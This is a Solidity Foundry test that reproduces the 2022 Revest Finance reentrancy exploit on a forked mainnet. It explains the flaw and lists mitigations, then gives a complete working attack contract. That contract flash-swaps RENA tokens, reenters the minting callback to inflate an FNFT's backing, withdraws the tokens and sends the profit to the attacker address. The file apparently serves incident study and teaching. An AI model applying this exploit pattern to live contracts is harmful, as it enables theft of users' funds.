// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";
import {IUniswapV2Pair} from "../utils/IUniswapV2Pair.sol";

// forge test --match-contract Exploit_RevestFinance -vvv
/*
On Mar 27 2022 an attacker stole ~$2MM USD in RENA tokens from an Revest.
The attacker managed to reenter the minting mechanism of the ERC-1155's with its callback.

// Attack Overview
Total Lost: ~$2MM USD
Attack Tx: https://etherscan.io/tx/0xe0b0c2672b760bef4e2851e91c69c8c0ad135c6987bbf1f43f5846d89e691428
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0xe0b0c2672b760bef4e2851e91c69c8c0ad135c6987bbf1f43f5846d89e691428

Exploited Contract: https://etherscan.io/address/0x2320A28f52334d62622cc2EaFa15DE55F9987eD9
Attacker Address: https://etherscan.io/address/0xef967ECE5322c0D7d26Dab41778ACb55CE5Bd58B
Attacker Contract: https://etherscan.io/address/0xb480Ac726528D1c195cD3bb32F19C92E8d928519
Attack Block: 14465357

// Key Info Sources
Twitter: https://twitter.com/BlockSecTeam/status/1508065573250678793
Article: https://blocksecteam.medium.com/revest-finance-vulnerabilities-more-than-re-entrancy-1609957b742f


Principle: Reetrancy on ERC1155

   function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable override returns (uint) {
        uint fnftId = getFNFTHandler().getNextId();

        {
            IRevest.LockParam memory addressLock;
            addressLock.addressLock = trigger;
            addressLock.lockType = IRevest.LockType.AddressLock;
            // Get or create lock based on address which can trigger unlock, assign lock to ID
            uint lockId = getLockManager().createLock(fnftId, addressLock);

            if(trigger.supportsInterface(ADDRESS_LOCK_INTERFACE_ID)) {
                IAddressLock(trigger).createLock(fnftId, lockId, arguments);
            }
        }
        // This is a public call to a third-party contract. Must be done after everything else.
        // Safe for reentry
        doMint(recipients, quantities, fnftId, fnftConfig, msg.value);

        emit FNFTAddressLockMinted(fnftConfig.asset, _msgSender(), fnftId, trigger, quantities, fnftConfig);

        return fnftId;
    }

    // Then, doMint call ends up calling tokenVault.depositToken():

    function depositToken(
        uint fnftId,
        uint transferAmount,
        uint quantity
    ) public override onlyRevestController {
        // Updates in advance, to handle rebasing tokens
        updateBalance(fnftId, quantity * transferAmount); // <----- HERE IS WHERE THE LOCKED BALANCE OF THE NFT IS ACCOUNTED
        IRevest.FNFTConfig storage fnft = fnfts[fnftId];
        fnft.depositMul = tokenTrackers[fnft.asset].lastMul;
    }

    // In revest.depositAdditionalToken(), the balance of an NFT is topped up with more tokens:
    function depositAdditionalToFNFT(
        uint fnftId,
        uint amount,
        uint quantity
    ) external override returns (uint) {
        ...
        ITokenVault(vault).depositToken(fnftId, amount, quantity);
        ...
    }

    // The FNFT Token Handler's mint function does not respect the Checks-Effects-Interactions pattern minting before updating internal variables.
    
    function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController {
        supply[id] += amount;
        _mint(account, id, amount, data);
        fnftsCreated += 1;
    }


ATTACK: 
Each FNFT could be redeemed by the accounted tokens it backs. The attacker created vaults (repredented by FNFTs) without backing them with RENA and
reentered with depositToken which updates the vault's balance before doMint.
1) Mints first a small amount to determine the currentId and to generate a small NFT position.
2) Mints a big NFT position and reenters the minting call with revest.depositAdditionalToken() with just 1e18 RENA so each token virtually backs that amount.
3) After the call finishes, the internal accoutancy interprets that the attacker sent 360,000 * 1e18 RENA instead of what he sent allowing him to redeem that amount of RENA.
 

MITIGATIONS:
1) Respect the checks-effects-interactions security pattern by minting tokens lastly on the mint call
2) Evaluate if checks are needed before minting in order to guarantee that the system works as intended (e.g. no checks present in the mint function).

*/

// Universal Smart Contract Registry where any address can register which interface it supports
// https://eips.ethereum.org/EIPS/eip-1820
interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IRevest {
    event FNFTTimeLockMinted(
        address indexed asset,
        address indexed from,
        uint indexed fnftId,
        uint endTime,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTValueLockMinted(
        address indexed primaryAsset,
        address indexed from,
        uint indexed fnftId,
        address compareTo,
        address oracleDispatch,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTAddressLockMinted(
        address indexed asset,
        address indexed from,
        uint indexed fnftId,
        address trigger,
        uint[] quantities,
        FNFTConfig fnftConfig
    );

    event FNFTWithdrawn(
        address indexed from,
        uint indexed fnftId,
        uint indexed quantity
    );

    event FNFTSplit(
        address indexed from,
        uint[] indexed newFNFTId,
        uint[] indexed proportions,
        uint quantity
    );

    event FNFTUnlocked(
        address indexed from,
        uint indexed fnftId
    );

    event FNFTMaturityExtended(
        address indexed from,
        uint indexed fnftId,
        uint indexed newExtendedTime
    );

    event FNFTAddionalDeposited(
        address indexed from,
        uint indexed newFNFTId,
        uint indexed quantity,
        uint amount
    );

    struct FNFTConfig {
        address asset; // The token being stored
        address pipeToContract; // Indicates if FNFT will pipe to another contract
        uint depositAmount; // How many tokens
        uint depositMul; // Deposit multiplier
        uint split; // Number of splits remaining
        uint depositStopTime; //
        bool maturityExtension; // Maturity extensions remaining
        bool isMulti; //
        bool nontransferrable; // False by default (transferrable) //
    }

    // Refers to the global balance for an ERC20, encompassing possibly many FNFTs
    struct TokenTracker {
        uint lastBalance;
        uint lastMul;
    }

    enum LockType {
        DoesNotExist,
        TimeLock,
        ValueLock,
        AddressLock
    }

    struct LockParam {
        address addressLock;
        uint timeLockExpiry;
        LockType lockType;
        ValueLock valueLock;
    }

    struct Lock {
        address addressLock;
        LockType lockType;
        ValueLock valueLock;
        uint timeLockExpiry;
        uint creationTime;
        bool unlocked;
    }

    struct ValueLock {
        address asset;
        address compareTo;
        address oracle;
        uint unlockValue;
        bool unlockRisingEdge;
    }

    function mintTimeLock(
        uint endTime,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function mintValueLock(
        address primaryAsset,
        address compareTo,
        uint unlockValue,
        bool unlockRisingEdge,
        address oracleDispatch,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory recipients,
        uint[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint);

    function withdrawFNFT(uint tokenUID, uint quantity) external;

    function unlockFNFT(uint tokenUID) external;

    function splitFNFT(
        uint fnftId,
        uint[] memory proportions,
        uint quantity
    ) external returns (uint[] memory newFNFTIds);

    function depositAdditionalToFNFT(
        uint fnftId,
        uint amount,
        uint quantity
    ) external returns (uint);

    function setFlatWeiFee(uint wethFee) external;

    function setERC20Fee(uint erc20) external;

    function getFlatWeiFee() external returns (uint);

    function getERC20Fee() external returns (uint);


}

contract Exploit_RevestFinance is TestHarness {
    IUniswapV2Pair internal renaWethPair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);

    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IRevest internal revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
    IERC20 internal rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);

    address internal constant attacker = 0xef967ECE5322c0D7d26Dab41778ACb55CE5Bd58B;

    uint256 reentrancyStep = 0;
    uint256 currentId;

    function setUp() external {
        cheat.createSelectFork("mainnet", 14465356); // We pin one block before the exploit happened.

        cheat.label(attacker, "Attacker");
    }

    function test_attack() public {
        // 1: Sets the interface in the Universal Registry
        // keccak256("ERC777TokensSender")
        bytes32 interfaceHash = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
        interfaceRegistry.setInterfaceImplementer(address(this), interfaceHash, address(this));

        // 2: Gives allowance to Revest
        rena.approve(address(revest), type(uint256).max);

        // 3: Flashswap Rena from pair by sending non-zero data.
        renaWethPair.swap(2000000000000000000, 0,  address(this), abi.encode(0x78));

    }

    function uniswapV2Call(address , uint amount0, uint , bytes calldata ) external  {
        require(address(renaWethPair) == msg.sender, "Only callable by pair");

          address[] memory _recipients = new address[](1);
        _recipients[0] = address(this);

        uint256[] memory _quantities = new uint256[](1);
        _quantities[0] = 2;

        IRevest.FNFTConfig memory nftConfig;
        nftConfig.asset = address(rena);
        nftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
        nftConfig.depositAmount = 0;
        nftConfig.depositMul = 0;
        nftConfig.split = 0;
        nftConfig.depositStopTime = 0;
        nftConfig.maturityExtension = false;
        nftConfig.isMulti = true;
        nftConfig.nontransferrable = false;


        // 4. Calls mintAddressLock to get 2 NFTS in order to get the current NFT id
        currentId = revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);

        // 4. Calls mintAddressLock again
        _quantities[0] = 360_000;
        revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);

        // 5. Cashout the NFTs for RENA
        revest.withdrawFNFT(currentId + 1, 360001);

        rena.transfer(address(renaWethPair), ((((amount0 / 997) * 1000) / 99) * 100) + 1000);

        uint256 renaEndingBalance = rena.balanceOf(address(this));
        emit log_named_decimal_uint("Rena Ending Profit", renaEndingBalance, 18);
        rena.transfer(attacker, renaEndingBalance);
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 id,
        uint256 ,
        bytes calldata 
    ) public returns (bytes4) {
        // Checking that the current minted ID is the next one to ensure that we mint all the NFTs of that ID
        if (id == currentId + 1 && (reentrancyStep == 0)) { // Using a reentrancyStep as a number allows us to perform different logics depending on the current callback step.
            reentrancyStep++;
            revest.depositAdditionalToFNFT(currentId, 1e18, 1);
        }
        return this.onERC1155Received.selector;
    }

}